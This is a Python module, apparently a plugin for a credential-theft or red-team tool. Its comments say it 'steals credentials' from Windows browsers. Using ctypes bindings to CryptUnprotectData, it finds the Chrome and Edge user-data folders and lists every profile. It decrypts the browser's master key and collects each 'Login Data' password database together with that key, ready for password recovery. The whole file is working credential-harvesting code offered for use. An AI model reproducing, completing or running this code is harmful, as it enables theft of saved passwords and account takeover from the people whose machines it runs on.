# NOTE: This only tries stealing credentials from the current user,
#       so no DPAPI logic is implemented yet. That requires more research.
#       We can decide to do this now or in a new version of the plugin.
#       (WinAPI is used for current user, DPAPI is used otherwise.)


import base64
import getpass
import json
import logging
import os
from ctypes import (
    POINTER,
    Structure,
    WinDLL,
    byref,
    c_buffer,
    c_char,
    create_string_buffer,
    memmove,
    sizeof,
)
from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPBYTE, LPCWSTR, LPSTR, LPVOID, LPWSTR
from pathlib import PurePath
from typing import Sequence

logger = logging.getLogger(__name__)


class CREDENTIAL_ATTRIBUTE(Structure):
    _fields_ = [("Keyword", LPSTR), ("Flags", DWORD), ("ValueSize", DWORD), ("Value", LPBYTE)]


PCREDENTIAL_ATTRIBUTE = POINTER(CREDENTIAL_ATTRIBUTE)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]


class CRYPTPROTECT_PROMPTSTRUCT(Structure):
    _fields_ = [
        ("cbSize", DWORD),
        ("dwPromptFlags", DWORD),
        ("hwndApp", HWND),
        ("szPrompt", LPCWSTR),
    ]


PCRYPTPROTECT_PROMPTSTRUCT = POINTER(CRYPTPROTECT_PROMPTSTRUCT)

crypt32 = WinDLL("crypt32", use_last_error=True)
kernel32 = WinDLL("kernel32", use_last_error=True)

LocalFree = kernel32.LocalFree
LocalFree.restype = HANDLE
LocalFree.argtypes = [HANDLE]

CryptUnprotectData = crypt32.CryptUnprotectData
CryptUnprotectData.restype = BOOL
CryptUnprotectData.argtypes = [
    POINTER(DATA_BLOB),
    POINTER(LPWSTR),
    POINTER(DATA_BLOB),
    LPVOID,
    PCRYPTPROTECT_PROMPTSTRUCT,
    DWORD,
    POINTER(DATA_BLOB),
]


def getData(blobOut):
    cbData = blobOut.cbData
    pbData = blobOut.pbData
    buffer = create_string_buffer(cbData)
    memmove(buffer, pbData, sizeof(buffer))
    LocalFree(pbData)
    return buffer.raw


def Win32CryptUnprotectData(cipherText, entropy=False):
    decrypted = None

    bufferIn = c_buffer(cipherText, len(cipherText))
    blobIn = DATA_BLOB(len(cipherText), bufferIn)
    blobOut = DATA_BLOB()

    if entropy:
        bufferEntropy = c_buffer(entropy, len(entropy))
        blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)

        if CryptUnprotectData(
            byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)
        ):
            decrypted = getData(blobOut)

    else:
        if CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut)):
            decrypted = getData(blobOut)

    return decrypted


DRIVE = "C"
LOCAL_APPDATA = "{drive}:\\Users\\{user}\\AppData\\Local"


class WindowsCredentialsDatabaseSelector:
    def __init__(self):
        user = getpass.getuser()
        local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)

        # TODO: decide what to do with this, make constant or inject it?
        self.browser_paths = [
            ("Chromium Edge", f"{local_appdata}\\Microsoft\\Edge\\User Data"),
            ("Google Chrome", f"{local_appdata}\\Google\\Chrome\\User Data"),
        ]

    def __call__(self) -> Sequence[PurePath]:
        return self._get_database_dirs()

    def _get_database_dirs(self):
        """
        Get browsers' credentials' database directories for current user
        """

        databases = set()
        for name, path in self.browser_paths:
            logger.info(f'Attempting to steal credentials from browser "{name}"')

            profiles_path = os.path.join(path, "Local State")
            if os.path.exists(profiles_path):
                master_key = None

                # user profiles in the browser; empty string means current dir, without a profile
                browser_profiles = {"Default", ""}

                # get all additional browser profiles
                for dirs in os.listdir(path):
                    dirs_path = os.path.join(path, dirs)
                    if os.path.isdir(dirs_path) and dirs.startswith("Profile"):
                        browser_profiles.add(dirs)

                with open(profiles_path) as f:
                    try:
                        # add user profiles from "Local State" file
                        data = json.load(f)
                        browser_profiles |= set(data["profile"]["info_cache"])
                    except json.decoder.JSONDecodeError:
                        logger.error(f'Couldn\'t deserialize JSON file at "{profiles_path}"')
                    except Exception as err:
                        logger.error(
                            "Exception encountered while trying to load user profiles "
                            f"from browser's local state: {err}"
                        )

                # TODO: is there a reason the context manager is reopened here?
                with open(profiles_path) as f:
                    try:
                        master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
                        master_key = master_key[5:]  # removing DPAPI
                        master_key = Win32CryptUnprotectData(
                            master_key,
                        )
                    except Exception:
                        master_key = None

                # each user profile has its own password database
                for profile in browser_profiles:
                    try:
                        db_files = os.listdir(os.path.join(path, profile))
                    except Exception as err:
                        logger.error(
                            "Exception encountered while trying to get "
                            f'password database file for user profile "{profile}": {err}'
                        )

                    for db in db_files:
                        if db.lower() == "login data":
                            # TODO: fix return type hints where necessary, probably can't
                            #       generalize linux/windows anymore
                            # TODO: return pathlib.Path object, not str
                            # TODO: `master_key` is the same for all databases,
                            #       can just return it once
                            databases.add((os.path.join(path, profile, db), master_key))

        return databases
